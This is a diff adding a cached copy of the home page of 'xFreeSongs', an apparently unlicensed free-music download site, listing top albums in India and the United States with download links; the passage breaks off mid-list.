@@ -1,0 +1,605 @@
+a:3:{s:1:"d";s:59623:"<!DOCTYPE html>
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Download free music - Free Songs Download</title>
+  <meta property="og:site_name" content="xFreeSongs - Free Songs Download">
+  <meta property="og:url" content="http://xfreesongs.com/">
+  <meta property="og:title" content="xFreeSongs - Free Songs Download">
+  <meta property="og:image" content="http://xfreesongs.com/images/social.png">
+  <meta property="og:description" content="Download free music!">
+  <link rel="canonical" href="http://xfreesongs.com/">
+  <meta name="robots" content="index,follow">
+  <link rel="alternate" hreflang="en" href="http://xfreesongs.com/" />
+  <link rel="alternate" hreflang="fr" href="http://xfreesongs.com/fr/" />
+  <link rel="alternate" hreflang="de" href="http://xfreesongs.com/de/" />
+  <link rel="alternate" hreflang="br" href="http://xfreesongs.com/br/" />
+  <!--link href="//cdnjs.cloudflare.com/ajax/libs/pace/0.6.0/themes/red/pace-theme-flash.css" rel="stylesheet"//-->
+<link href="http://xfreesongs.com/result_files/a.css" rel="stylesheet">
+<!--[if lt IE 9]>
+<script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/respond.js/1.4.2/respond.min.js"></script>
+<![endif]-->
+<link rel="apple-touch-icon" sizes="57x57" href="http://xfreesongs.com/images/apple-touch-icon-57x57.png">
+<link rel="apple-touch-icon" sizes="114x114" href="http://xfreesongs.com/images/apple-touch-icon-114x114.png">
+<link rel="apple-touch-icon" sizes="72x72" href="http://xfreesongs.com/images/apple-touch-icon-72x72.png">
+<link rel="apple-touch-icon" sizes="144x144" href="http://xfreesongs.com/images/apple-touch-icon-144x144.png">
+<link rel="apple-touch-icon" sizes="60x60" href="http://xfreesongs.com/images/apple-touch-icon-60x60.png">
+<link rel="apple-touch-icon" sizes="120x120" href="http://xfreesongs.com/images/apple-touch-icon-120x120.png">
+<link rel="apple-touch-icon" sizes="76x76" href="http://xfreesongs.com/images/apple-touch-icon-76x76.png">
+<link rel="apple-touch-icon" sizes="152x152" href="http://xfreesongs.com/images/apple-touch-icon-152x152.png">
+<link rel="apple-touch-icon" sizes="180x180" href="http://xfreesongs.com/images/apple-touch-icon-180x180.png">
+<link rel="icon" type="image/png" href="http://xfreesongs.com/images/favicon-192x192.png" sizes="192x192">
+<link rel="icon" type="image/png" href="http://xfreesongs.com/images/favicon-160x160.png" sizes="160x160">
+<link rel="icon" type="image/png" href="http://xfreesongs.com/images/favicon-96x96.png" sizes="96x96">
+<link rel="icon" type="image/png" href="http://xfreesongs.com/images/favicon-16x16.png" sizes="16x16">
+<link rel="icon" type="image/png" href="http://xfreesongs.com/images/favicon-32x32.png" sizes="32x32">
+<meta name="msapplication-TileColor" content="#da532c">
+<meta name="msapplication-TileImage" content="http://xfreesongs.com//images/mstile-144x144.png">
+</head>
+<body>
+<div class="row clearfix" style="margin-left: 10px; margin-right: 10px;">
+    <div class="col-md-12 column">
+        <nav class="navbar navbar-default navbar-fixed-top" role="navigation" style="margin-left: -14px; margin-right: -14px;-webkit-box-shadow:0 6px 6px -6px #777;-moz-box-shadow:0 6px 6px -6px #777;box-shadow:0 6px 6px -6px #777;">
+            <div class="navbar-header">
+                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#menu"><span class="sr-only">Toggle navigation</span><span class="icon-bar"></span><span class="icon-bar"></span><span class="icon-bar"></span></button> <a class="navbar-brand" href="http://xfreesongs.com/"><img style="width:160px;margin-top:-5px" alt="Free Songs Download" src="http://xfreesongs.com/result_files/logo1.png"></a>
+            </div>
+            <div class="collapse navbar-collapse " id="menu">
+                <ul class="nav navbar-nav">
+                    <li>
+                        <a href="http://xfreesongs.com/"><i class="fa fa-home"></i> Home</a>
+                    </li>
+                    <li class="dropdown">
+                        <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false"><i class="fa fa-line-chart"></i> Top Chart <span class="caret"></span></a>
+                        <ul class="dropdown-menu">
+                            <li><a href="http://xfreesongs.com/top-world/"><i class="fa fa-line-chart"></i> Top 50 (World)</a></li>
+                            <li><a href="http://xfreesongs.com/top-india/"><i class="fa fa-line-chart"></i> Top 50(India)</a></li>
+                            <li><a href="http://xfreesongs.com/top-france/"><i class="fa fa-line-chart"></i> Top 50(France)</a></li>
+                            <li role="separator" class="divider"></li>
+                            <li class="dropdown-header">More Chart</li>
+                            <li><a href="http://xfreesongs.com/top-uk/"><i class="fa fa-line-chart"></i> Top 50 (UK)</a></li>
+                        </ul>
+                    </li>
+                    <li>
+                        <a href="http://xfreesongs.com/dmca.php"><i class="fa fa-copyright"></i> DMCA</a>
+                    </li>
+                    <li>
+                        <a href="http://xfreesongs.com/contactus.php"><i class="fa fa-envelope-o"></i> Contact Us</a>
+                    </li>
+                                </ul>
+            <ul class="nav navbar-nav ">
+                <li class="dropdown">
+                    <a href="#" class="dropdown-toggle " data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false"><i class="fa fa-language"></i> Language <span class="caret"></span></a>
+                    <ul class="dropdown-menu">
+                                                <li class="active"><a href="http://xfreesongs.com/en/" ><i class="fa fa-caret-right"></i> English</a></li>
+                        <li ><a href="http://xfreesongs.com/fr/" ><i class="fa fa-caret-right"></i> French</a></li>
+                        <li ><a href="http://xfreesongs.com/de/" ><i class="fa fa-caret-right"></i> Dutch</a></li>
+                        <li ><a href="http://xfreesongs.com/br/" ><i class="fa fa-caret-right"></i> Portuguese</a></li>
+                                            </ul>
+                </li>
+            </ul>
+        </div>
+    </nav>
+</div>
+</div>
+<div class="container">
+<div class="well" style="-webkit-box-shadow:0 6px 6px -6px #777;-moz-box-shadow:0 6px 6px -6px #777;box-shadow:0 6px 6px -6px #777;">
+    <center>
+        <a href="http://xfreesongs.com/"><img style="margin-top:-5px;margin-bottom:5px" class="thumbnail1 img-responsive" alt="Free Songs Download" src="http://xfreesongs.com/result_files/home.png"></a>
+        <form action="http://xfreesongs.com/find.php" method="get">
+        <div class="input-group col-lg-8">
+            <input name="search" class="form-control input-lg" autofocus="autofocus" autocomplete="off" id="query"  placeholder="Search your favorite song,album or artist" required="" type="text">
+            <span class="input-group-btn"><button class="btn btn-primary" style="height:48px;" type="submit">Search</button></span>
+        </div>
+    </form>
+      </center><div class="tabbable"> <!-- Only required for left/right tabs -->
+  <ul class="nav nav-tabs">
+    <li class="active"><a href="#tab1" data-toggle="tab"><span><b>India Top Albums</b></span></a></li>
+    <li><a href="#tab2" data-toggle="tab"><span><b>United States Top Albums</b></span></a></li>
+  </ul>
+  <div class="tab-content">
+    <div class="tab-pane active" id="tab1">
+      <center><h1>Today's Top Music Albums in India by Free Songs Download</h1></center>
+            <div class="col-md-4 col-sm-6 col-xs-12" style="padding-left: 5px; padding-bottom: 10px;">
+        <div class="col-xs-12" >
+          <div class="col-xs-3">
+            <img class="img-rounded img-responsive lazy" border="0" style="font-size: 5px;" alt="Baahubali 2 - The Conclusion (Original Motion Picture Soundtrack) - EP" title="Baahubali 2 - The Conclusion (Original Motion Picture Soundtrack) - EP" data-original="http://is2.mzstatic.com/image/thumb/Music122/v4/83/cb/ee/83cbeeae-12c1-56e4-c9e5-eca8ff55133f/8903431639271_cover.jpg/100x100bb-85.jpg">
+          </div>
+          <div class="col-xs-9">
+            <ul class="list-unstyled">
+              <li style="border-bottom: 1px dotted #D2CFFC;padding-bottom: 2px;white-space:nowrap;overflow:hidden;text-overflow: ellipsis;"><span><b><i class="fa fa-check-square"></i></b> <b>Baahubali 2 - The Conclusion (Original Motion Picture Soundtrack) - EP</b></span></li>
+              <li style="font-size: 13px;text-shadow: 1px 1px #fff;border-bottom: 1px dotted #D2CFFC;padding-top: 2px;padding-bottom: 2px;white-space:nowrap;overflow:hidden;text-overflow: ellipsis;" ><b><i class="fa fa-user"></i></b> <span>M.M. Keeravaani</span></li>
+              <li style="font-size: 13px;padding-top: 5px;"><div class="mp3-dl"><a href="http://xfreesongs.com/en/album-detail/1219281887/Baahubali-2-The-Conclusion-Original-Motion-Picture-Soundtrack-EP.html"><span><b><i class="fa fa-download"></i> Download</b></span></a></div></li>
+            </ul>
+          </div>
+        </div>
+      </div>
+            <div class="col-md-4 col-sm-6 col-xs-12" style="padding-left: 5px; padding-bottom: 10px;">
+        <div class="col-xs-12" >
+          <div class="col-xs-3">
+            <img class="img-rounded img-responsive lazy" border="0" style="font-size: 5px;" alt="Kaatru Veliyidai (Original Motion Picture Soundtrack) - EP" title="Kaatru Veliyidai (Original Motion Picture Soundtrack) - EP" data-original="http://is2.mzstatic.com/image/thumb/Music111/v4/eb/5c/d8/eb5cd844-91b1-b244-3b4f-5fd5ca1a7657/886446427027.jpg/100x100bb-85.jpg">
+          </div>
+          <div class="col-xs-9">
+            <ul class="list-unstyled">
+              <li style="border-bottom: 1px dotted #D2CFFC;padding-bottom: 2px;white-space:nowrap;overflow:hidden;text-overflow: ellipsis;"><span><b><i class="fa fa-check-square"></i></b> <b>Kaatru Veliyidai (Original Motion Picture Soundtrack) - EP</b></span></li>
+              <li style="font-size: 13px;text-shadow: 1px 1px #fff;border-bottom: 1px dotted #D2CFFC;padding-top: 2px;padding-bottom: 2px;white-space:nowrap;overflow:hidden;text-overflow: ellipsis;" ><b><i class="fa fa-user"></i></b> <span>A. R. Rahman</span></li>
+              <li style="font-size: 13px;padding-top: 5px;"><div class="mp3-dl"><a href="http://xfreesongs.com/en/album-detail/1215595688/Kaatru-Veliyidai-Original-Motion-Picture-Soundtrack-EP.html"><span><b><i class="fa fa-download"></i> Download</b></span></a></div></li>
+            </ul>
+          </div>
+        </div>
+      </div>
+            <div class="col-md-4 col-sm-6 col-xs-12" style="padding-left: 5px; padding-bottom: 10px;">
+        <div class="col-xs-12" >
+          <div class="col-xs-3">
+            <img class="img-rounded img-responsive lazy" border="0" style="font-size: 5px;" alt="Badrinath Ki Dulhania (Original Motion Picture Soundtrack) - EP" title="Badrinath Ki Dulhania (Original Motion Picture Soundtrack) - EP" data-original="http://is4.mzstatic.com/image/thumb/Music111/v4/c2/81/21/c28121b6-cde6-ae04-b4d2-deda17c4ea30/8902894358804_cover.jpg/100x100bb-85.jpg">
+          </div>
+          <div class="col-xs-9">
+            <ul class="list-unstyled">
+              <li style="border-bottom: 1px dotted #D2CFFC;padding-bottom: 2px;white-space:nowrap;overflow:hidden;text-overflow: ellipsis;"><span><b><i class="fa fa-check-square"></i></b> <b>Badrinath Ki Dulhania (Original Motion Picture Soundtrack) - EP</b></span></li>
+              <li style="font-size: 13px;text-shadow: 1px 1px #fff;border-bottom: 1px dotted #D2CFFC;padding-top: 2px;padding-bottom: 2px;white-space:nowrap;overflow:hidden;text-overflow: ellipsis;" ><b><i class="fa fa-user"></i></b> <span>Amaal Mallik, Akhil Sachdeva, Tanishk Bagchi & Bappi Lahiri</span></li>
+              <li style="font-size: 13px;padding-top: 5px;"><div class="mp3-dl"><a href="http://xfreesongs.com/en/album-detail/1205913413/Badrinath-Ki-Dulhania-Original-Motion-Picture-Soundtrack-EP.html"><span><b><i class="fa fa-download"></i> Download</b></span></a></div></li>
+            </ul>
+          </div>
+        </div>
+      </div>
+            <div class="col-md-4 col-sm-6 col-xs-12" style="padding-left: 5px; padding-bottom: 10px;">
+        <div class="col-xs-12" >
+          <div class="col-xs-3">
+            <img class="img-rounded img-responsive lazy" border="0" style="font-size: 5px;" alt="Automaton" title="Automaton" data-original="http://is5.mzstatic.com/image/thumb/Music111/v4/46/90/d4/4690d4aa-7446-35e2-0f1b-a6fced33ea5f/16UMGIM79993.jpg/100x100bb-85.jpg">
+          </div>
+          <div class="col-xs-9">
+            <ul class="list-unstyled">
+              <li style="border-bottom: 1px dotted #D2CFFC;padding-bottom: 2px;white-space:nowrap;overflow:hidden;text-overflow: ellipsis;"><span><b><i class="fa fa-check-square"></i></b> <b>Automaton</b></span></li>
+              <li style="font-size: 13px;text-shadow: 1px 1px #fff;border-bottom: 1px dotted #D2CFFC;padding-top: 2px;padding-bottom: 2px;white-space:nowrap;overflow:hidden;text-overflow: ellipsis;" ><b><i class="fa fa-user"></i></b> <span>Jamiroquai</span></li>
+              <li style="font-size: 13px;padding-top: 5px;"><div class="mp3-dl"><a href="http://xfreesongs.com/en/album-detail/1194859992/Automaton.html"><span><b><i class="fa fa-download"></i> Download</b></span></a></div></li>
+            </ul>
+          </div>
+        </div>
+      </div>
+            <div class="col-md-4 col-sm-6 col-xs-12" style="padding-left: 5px; padding-bottom: 10px;">
+        <div class="col-xs-12" >
+          <div class="col-xs-3">
+            <img class="img-rounded img-responsive lazy" border="0" style="font-size: 5px;" alt="Triplicate" title="Triplicate" data-original="http://is1.mzstatic.com/image/thumb/Music122/v4/d8/8a/cd/d88acd8c-6c9d-7753-a6c3-39e45933465e/886446339672.jpg/100x100bb-85.jpg">
+          </div>
+          <div class="col-xs-9">
+            <ul class="list-unstyled">
+              <li style="border-bottom: 1px dotted #D2CFFC;padding-bottom: 2px;white-space:nowrap;overflow:hidden;text-overflow: ellipsis;"><span><b><i class="fa fa-check-square"></i></b> <b>Triplicate</b></span></li>
+              <li style="font-size: 13px;text-shadow: 1px 1px #fff;border-bottom: 1px dotted #D2CFFC;padding-top: 2px;padding-bottom: 2px;white-space:nowrap;overflow:hidden;text-overflow: ellipsis;" ><b><i class="fa fa-user"></i></b> <span>Bob Dylan</span></li>
+              <li style="font-size: 13px;padding-top: 5px;"><div class="mp3-dl"><a href="http://xfreesongs.com/en/album-detail/1199674486/Triplicate.html"><span><b><i class="fa fa-download"></i> Download</b></span></a></div></li>
+            </ul>
+          </div>
+        </div>
+      </div>
+            <div class="col-md-4 col-sm-6 col-xs-12" style="padding-left: 5px; padding-bottom: 10px;">
+        <div class="col-xs-12" >
+          <div class="col-xs-3">
+            <img class="img-rounded img-responsive lazy" border="0" style="font-size: 5px;" alt="Cheliyaa (Original Motion Picture Soundtrack) - EP" title="Cheliyaa (Original Motion Picture Soundtrack) - EP" data-original="http://is2.mzstatic.com/image/thumb/Music111/v4/96/83/1a/96831a38-c178-e592-2166-abdfac7380ca/886446427034.jpg/100x100bb-85.jpg">
+          </div>
+          <div class="col-xs-9">
+            <ul class="list-unstyled">
+              <li style="border-bottom: 1px dotted #D2CFFC;padding-bottom: 2px;white-space:nowrap;overflow:hidden;text-overflow: ellipsis;"><span><b><i class="fa fa-check-square"></i></b> <b>Cheliyaa (Original Motion Picture Soundtrack) - EP</b></span></li>
+              <li style="font-size: 13px;text-shadow: 1px 1px #fff;border-bottom: 1px dotted #D2CFFC;padding-top: 2px;padding-bottom: 2px;white-space:nowrap;overflow:hidden;text-overflow: ellipsis;" ><b><i class="fa fa-user"></i></b> <span>A. R. Rahman</span></li>
+              <li style="font-size: 13px;padding-top: 5px;"><div class="mp3-dl"><a href="http://xfreesongs.com/en/album-detail/1215599055/Cheliyaa-Original-Motion-Picture-Soundtrack-EP.html"><span><b><i class="fa fa-download"></i> Download</b></span></a></div></li>
+            </ul>
+          </div>
+        </div>
+      </div>
+            <div class="col-md-4 col-sm-6 col-xs-12" style="padding-left: 5px; padding-bottom: 10px;">
+        <div class="col-xs-12" >
+          <div class="col-xs-3">
+            <img class="img-rounded img-responsive lazy" border="0" style="font-size: 5px;" alt="Noor (Original Motion Picture Soundtrack) - EP" title="Noor (Original Motion Picture Soundtrack) - EP" data-original="http://is4.mzstatic.com/image/thumb/Music122/v4/df/95/fb/df95fb11-8359-67f0-dc83-a924833e5918/8902894358927_cover.jpg/100x100bb-85.jpg">
+          </div>
+          <div class="col-xs-9">
+            <ul class="list-unstyled">
+              <li style="border-bottom: 1px dotted #D2CFFC;padding-bottom: 2px;white-space:nowrap;overflow:hidden;text-overflow: ellipsis;"><span><b><i class="fa fa-check-square"></i></b> <b>Noor (Original Motion Picture Soundtrack) - EP</b></span></li>
+              <li style="font-size: 13px;text-shadow: 1px 1px #fff;border-bottom: 1px dotted #D2CFFC;padding-top: 2px;padding-bottom: 2px;white-space:nowrap;overflow:hidden;text-overflow: ellipsis;" ><b><i class="fa fa-user"></i></b> <span>Amaal Mallik & R.D. Burman</span></li>
+              <li style="font-size: 13px;padding-top: 5px;"><div class="mp3-dl"><a href="http://xfreesongs.com/en/album-detail/1218803715/Noor-Original-Motion-Picture-Soundtrack-EP.html"><span><b><i class="fa fa-download"></i> Download</b></span></a></div></li>
+            </ul>
+          </div>
+        </div>
+      </div>
+            <div class="col-md-4 col-sm-6 col-xs-12" style="padding-left: 5px; padding-bottom: 10px;">
+        <div class="col-xs-12" >
+          <div class="col-xs-3">
+            <img class="img-rounded img-responsive lazy" border="0" style="font-size: 5px;" alt="Kavan (Original Motion Picture Soundtrack) - EP" title="Kavan (Original Motion Picture Soundtrack) - EP" data-original="http://is1.mzstatic.com/image/thumb/Music122/v4/c5/27/e4/c527e448-b46e-c1a5-0dbb-b41ff571f5de/Kavan.jpg/100x100bb-85.jpg">
+          </div>
+          <div class="col-xs-9">
+            <ul class="list-unstyled">
+              <li style="border-bottom: 1px dotted #D2CFFC;padding-bottom: 2px;white-space:nowrap;overflow:hidden;text-overflow: ellipsis;"><span><b><i class="fa fa-check-square"></i></b> <b>Kavan (Original Motion Picture Soundtrack) - EP</b></span></li>
+              <li style="font-size: 13px;text-shadow: 1px 1px #fff;border-bottom: 1px dotted #D2CFFC;padding-top: 2px;padding-bottom: 2px;white-space:nowrap;overflow:hidden;text-overflow: ellipsis;" ><b><i class="fa fa-user"></i></b> <span>Hiphop Tamizha</span></li>
+              <li style="font-size: 13px;padding-top: 5px;"><div class="mp3-dl"><a href="http://xfreesongs.com/en/album-detail/1202808563/Kavan-Original-Motion-Picture-Soundtrack-EP.html"><span><b><i class="fa fa-download"></i> Download</b></span></a></div></li>
+            </ul>
+          </div>
+        </div>
+      </div>
+            <div class="col-md-4 col-sm-6 col-xs-12" style="padding-left: 5px; padding-bottom: 10px;">
+        <div class="col-xs-12" >
+          <div class="col-xs-3">
+            <img class="img-rounded img-responsive lazy" border="0" style="font-size: 5px;" alt="Los Amsterdam" title="Los Amsterdam" data-original="http://is2.mzstatic.com/image/thumb/Music111/v4/7f/e0/d6/7fe0d6a7-4690-770c-ca60-349bcd911036/622.jpg/100x100bb-85.jpg">
+          </div>
+          <div class="col-xs-9">
+            <ul class="list-unstyled">
+              <li style="border-bottom: 1px dotted #D2CFFC;padding-bottom: 2px;white-space:nowrap;overflow:hidden;text-overflow: ellipsis;"><span><b><i class="fa fa-check-square"></i></b> <b>Los Amsterdam</b></span></li>
+              <li style="font-size: 13px;text-shadow: 1px 1px #fff;border-bottom: 1px dotted #D2CFFC;padding-top: 2px;padding-bottom: 2px;white-space:nowrap;overflow:hidden;text-overflow: ellipsis;" ><b><i class="fa fa-user"></i></b> <span>Yellow Claw</span></li>
+              <li style="font-size: 13px;padding-top: 5px;"><div class="mp3-dl"><a href="http://xfreesongs.com/en/album-detail/1203534780/Los-Amsterdam.html"><span><b><i class="fa fa-download"></i> Download</b></span></a></div></li>
+            </ul>
+          </div>
+        </div>
+      </div>
+            <div class="col-md-4 col-sm-6 col-xs-12" style="padding-left: 5px; padding-bottom: 10px;">
+        <div class="col-xs-12" >
+          <div class="col-xs-3">
+            <img class="img-rounded img-responsive lazy" border="0" style="font-size: 5px;" alt="Best of Kishore Kumar" title="Best of Kishore Kumar" data-original="http://is2.mzstatic.com/image/thumb/Music3/v4/ed/ac/0f/edac0f7d-435d-67db-b124-753ce8954d43/cover.jpg/100x100bb-85.jpg">
+          </div>
+          <div class="col-xs-9">
+            <ul class="list-unstyled">
+              <li style="border-bottom: 1px dotted #D2CFFC;padding-bottom: 2px;white-space:nowrap;overflow:hidden;text-overflow: ellipsis;"><span><b><i class="fa fa-check-square"></i></b> <b>Best of Kishore Kumar</b></span></li>
+              <li style="font-size: 13px;text-shadow: 1px 1px #fff;border-bottom: 1px dotted #D2CFFC;padding-top: 2px;padding-bottom: 2px;white-space:nowrap;overflow:hidden;text-overflow: ellipsis;" ><b><i class="fa fa-user"></i></b> <span>Kishore Kumar</span></li>
+              <li style="font-size: 13px;padding-top: 5px;"><div class="mp3-dl"><a href="http://xfreesongs.com/en/album-detail/925062461/Best-of-Kishore-Kumar.html"><span><b><i class="fa fa-download"></i> Download</b></span></a></div></li>
+            </ul>
+          </div>
+        </div>
+      </div>
+            <div class="col-md-4 col-sm-6 col-xs-12" style="padding-left: 5px; padding-bottom: 10px;">
+        <div class="col-xs-12" >
+          <div class="col-xs-3">
+            <img class="img-rounded img-responsive lazy" border="0" style="font-size: 5px;" alt="÷ (Deluxe)" title="÷ (Deluxe)" data-original="http://is3.mzstatic.com/image/thumb/Music122/v4/9a/35/95/9a3595c7-c675-fd74-352f-44e3638ac123/190295851286.jpg/100x100bb-85.jpg">
+          </div>
+          <div class="col-xs-9">
+            <ul class="list-unstyled">
+              <li style="border-bottom: 1px dotted #D2CFFC;padding-bottom: 2px;white-space:nowrap;overflow:hidden;text-overflow: ellipsis;"><span><b><i class="fa fa-check-square"></i></b> <b>÷ (Deluxe)</b></span></li>
+              <li style="font-size: 13px;text-shadow: 1px 1px #fff;border-bottom: 1px dotted #D2CFFC;padding-top: 2px;padding-bottom: 2px;white-space:nowrap;overflow:hidden;text-overflow: ellipsis;" ><b><i class="fa fa-user"></i></b> <span>Ed Sheeran</span></li>
+              <li style="font-size: 13px;padding-top: 5px;"><div class="mp3-dl"><a href="http://xfreesongs.com/en/album-detail/1193701079/Deluxe.html"><span><b><i class="fa fa-download"></i> Download</b></span></a></div></li>
+            </ul>
+          </div>
+        </div>
+      </div>
+            <div class="col-md-4 col-sm-6 col-xs-12" style="padding-left: 5px; padding-bottom: 10px;">
+        <div class="col-xs-12" >
+          <div class="col-xs-3">
+            <img class="img-rounded img-responsive lazy" border="0" style="font-size: 5px;" alt="Best of Arijit Singh" title="Best of Arijit Singh" data-original="http://is4.mzstatic.com/image/thumb/Music82/v4/41/47/4b/41474b97-952f-fbb2-834d-7d0486a41148/8903431566911_cover.jpg/100x100bb-85.jpg">
+          </div>
+          <div class="col-xs-9">
+            <ul class="list-unstyled">
+              <li style="border-bottom: 1px dotted #D2CFFC;padding-bottom: 2px;white-space:nowrap;overflow:hidden;text-overflow: ellipsis;"><span><b><i class="fa fa-check-square"></i></b> <b>Best of Arijit Singh</b></span></li>
+              <li style="font-size: 13px;text-shadow: 1px 1px #fff;border-bottom: 1px dotted #D2CFFC;padding-top: 2px;padding-bottom: 2px;white-space:nowrap;overflow:hidden;text-overflow: ellipsis;" ><b><i class="fa fa-user"></i></b> <span>Arijit Singh</span></li>
+              <li style="font-size: 13px;padding-top: 5px;"><div class="mp3-dl"><a href="http://xfreesongs.com/en/album-detail/1193069171/Best-of-Arijit-Singh.html"><span><b><i class="fa fa-download"></i> Download</b></span></a></div></li>
+            </ul>
+          </div>
+        </div>
+      </div>
+          </div>
+    <div class="tab-pane" id="tab2">
+      <center><h1>Today's Top Music Albums in United States by Free Songs Download</h1></center>
+            <div class="col-md-4 col-sm-6 col-xs-12" style="padding-left: 5px;">
+        <div class="col-xs-12" style="border-radius: 4px;padding:5px;background-color:#F3F3F3;">
+          <div class="col-xs-3">
+            <img class="img-rounded img-responsive lazy" border="0" style="font-size: 5px;" alt="Emperor of Sand" title="Emperor of Sand" data-original="http://is2.mzstatic.com/image/thumb/Music111/v4/90/33/e6/9033e672-148f-84a6-c1fe-a0bdf3537d11/093624914020.jpg/100x100bb-85.jpg">
+          </div>
+          <div class="col-xs-9">
+            <ul class="list-unstyled">
+              <li style="border-bottom: 1px dotted #D2CFFC;padding-bottom: 2px;white-space:nowrap;overflow:hidden;text-overflow: ellipsis;"><span><b><i class="fa fa-check-square"></i></b> <b>Emperor of Sand</b></span></li>
+              <li style="font-size: 13px;text-shadow: 1px 1px #fff;border-bottom: 1px dotted #D2CFFC;padding-top: 2px;padding-bottom: 2px;white-space:nowrap;overflow:hidden;text-overflow: ellipsis;" ><b><i class="fa fa-user"></i></b> <span>Mastodon</span></li>
+              <li style="font-size: 13px;padding-top: 5px;"><div class="mp3-dl"><a href="http://xfreesongs.com/en/album-detail/1195230194/Emperor-of-Sand.html"><span><b><i class="fa fa-download"></i> Download</b></span></a></div></li>
+            </ul>
+          </div>
+        </div>
+      </div>
+            <div class="col-md-4 col-sm-6 col-xs-12" style="padding-left: 5px;">
+        <div class="col-xs-12" style="border-radius: 4px;padding:5px;background-color:#F3F3F3;">
+          <div class="col-xs-3">
+            <img class="img-rounded img-responsive lazy" border="0" style="font-size: 5px;" alt="Lifer" title="Lifer" data-original="http://is4.mzstatic.com/image/thumb/Music122/v4/67/16/9c/67169c7f-d1d1-a11f-c8f3-cb062a7c341a/886446319445.jpg/100x100bb-85.jpg">
+          </div>
+          <div class="col-xs-9">
+            <ul class="list-unstyled">
+              <li style="border-bottom: 1px dotted #D2CFFC;padding-bottom: 2px;white-space:nowrap;overflow:hidden;text-overflow: ellipsis;"><span><b><i class="fa fa-check-square"></i></b> <b>Lifer</b></span></li>
+              <li style="font-size: 13px;text-shadow: 1px 1px #fff;border-bottom: 1px dotted #D2CFFC;padding-top: 2px;padding-bottom: 2px;white-space:nowrap;overflow:hidden;text-overflow: ellipsis;" ><b><i class="fa fa-user"></i></b> <span>MercyMe</span></li>
+              <li style="font-size: 13px;padding-top: 5px;"><div class="mp3-dl"><a href="http://xfreesongs.com/en/album-detail/1204836754/Lifer.html"><span><b><i class="fa fa-download"></i> Download</b></span></a></div></li>
+            </ul>
+          </div>
+        </div>
+      </div>
+            <div class="col-md-4 col-sm-6 col-xs-12" style="padding-left: 5px;">
+        <div class="col-xs-12" style="border-radius: 4px;padding:5px;background-color:#F3F3F3;">
+          <div class="col-xs-3">
+            <img class="img-rounded img-responsive lazy" border="0" style="font-size: 5px;" alt="More Life" title="More Life" data-original="http://is5.mzstatic.com/image/thumb/Music122/v4/f6/06/40/f60640a0-3486-975e-8677-3e19476c34f0/UMG_cvrart_00602557579376_01_RGB72_1800x1800_17UMGIM85032.jpg/100x100bb-85.jpg">
+          </div>
+          <div class="col-xs-9">
+            <ul class="list-unstyled">
+              <li style="border-bottom: 1px dotted #D2CFFC;padding-bottom: 2px;white-space:nowrap;overflow:hidden;text-overflow: ellipsis;"><span><b><i class="fa fa-check-square"></i></b> <b>More Life</b></span></li>
+              <li style="font-size: 13px;text-shadow: 1px 1px #fff;border-bottom: 1px dotted #D2CFFC;padding-top: 2px;padding-bottom: 2px;white-space:nowrap;overflow:hidden;text-overflow: ellipsis;" ><b><i class="fa fa-user"></i></b> <span>Drake</span></li>
+              <li style="font-size: 13px;padding-top: 5px;"><div class="mp3-dl"><a href="http://xfreesongs.com/en/album-detail/1216986780/More-Life.html"><span><b><i class="fa fa-download"></i> Download</b></span></a></div></li>
+            </ul>
+          </div>
+        </div>
+      </div>
+            <div class="col-md-4 col-sm-6 col-xs-12" style="padding-left: 5px;">
+        <div class="col-xs-12" style="border-radius: 4px;padding:5px;background-color:#F3F3F3;">
+          <div class="col-xs-3">
+            <img class="img-rounded img-responsive lazy" border="0" style="font-size: 5px;" alt="Painting Pictures" title="Painting Pictures" data-original="http://is4.mzstatic.com/image/thumb/Music111/v4/68/c2/24/68c224d2-1bdd-d4d1-1c6f-0eeb68d608cc/075679899248.jpg/100x100bb-85.jpg">
+          </div>
+          <div class="col-xs-9">
+            <ul class="list-unstyled">
+              <li style="border-bottom: 1px dotted #D2CFFC;padding-bottom: 2px;white-space:nowrap;overflow:hidden;text-overflow: ellipsis;"><span><b><i class="fa fa-check-square"></i></b> <b>Painting Pictures</b></span></li>
+              <li style="font-size: 13px;text-shadow: 1px 1px #fff;border-bottom: 1px dotted #D2CFFC;padding-top: 2px;padding-bottom: 2px;white-space:nowrap;overflow:hidden;text-overflow: ellipsis;" ><b><i class="fa fa-user"></i></b> <span>Kodak Black</span></li>
+              <li style="font-size: 13px;padding-top: 5px;"><div class="mp3-dl"><a href="http://xfreesongs.com/en/album-detail/1220045763/Painting-Pictures.html"><span><b><i class="fa fa-download"></i> Download</b></span></a></div></li>
+            </ul>
+          </div>
+        </div>
+      </div>
+            <div class="col-md-4 col-sm-6 col-xs-12" style="padding-left: 5px;">
+        <div class="col-xs-12" style="border-radius: 4px;padding:5px;background-color:#F3F3F3;">
+          <div class="col-xs-3">
+            <img class="img-rounded img-responsive lazy" border="0" style="font-size: 5px;" alt="÷ (Deluxe)" title="÷ (Deluxe)" data-original="http://is3.mzstatic.com/image/thumb/Music122/v4/9a/35/95/9a3595c7-c675-fd74-352f-44e3638ac123/190295851286.jpg/100x100bb-85.jpg">
+          </div>
+          <div class="col-xs-9">
+            <ul class="list-unstyled">
+              <li style="border-bottom: 1px dotted #D2CFFC;padding-bottom: 2px;white-space:nowrap;overflow:hidden;text-overflow: ellipsis;"><span><b><i class="fa fa-check-square"></i></b> <b>÷ (Deluxe)</b></span></li>
+              <li style="font-size: 13px;text-shadow: 1px 1px #fff;border-bottom: 1px dotted #D2CFFC;padding-top: 2px;padding-bottom: 2px;white-space:nowrap;overflow:hidden;text-overflow: ellipsis;" ><b><i class="fa fa-user"></i></b> <span>Ed Sheeran</span></li>
+              <li style="font-size: 13px;padding-top: 5px;"><div class="mp3-dl"><a href="http://xfreesongs.com/en/album-detail/1193701079/Deluxe.html"><span><b><i class="fa fa-download"></i> Download</b></span></a></div></li>
+            </ul>
+          </div>
+        </div>
+      </div>
+            <div class="col-md-4 col-sm-6 col-xs-12" style="padding-left: 5px;">
+        <div class="col-xs-12" style="border-radius: 4px;padding:5px;background-color:#F3F3F3;">
+          <div class="col-xs-3">
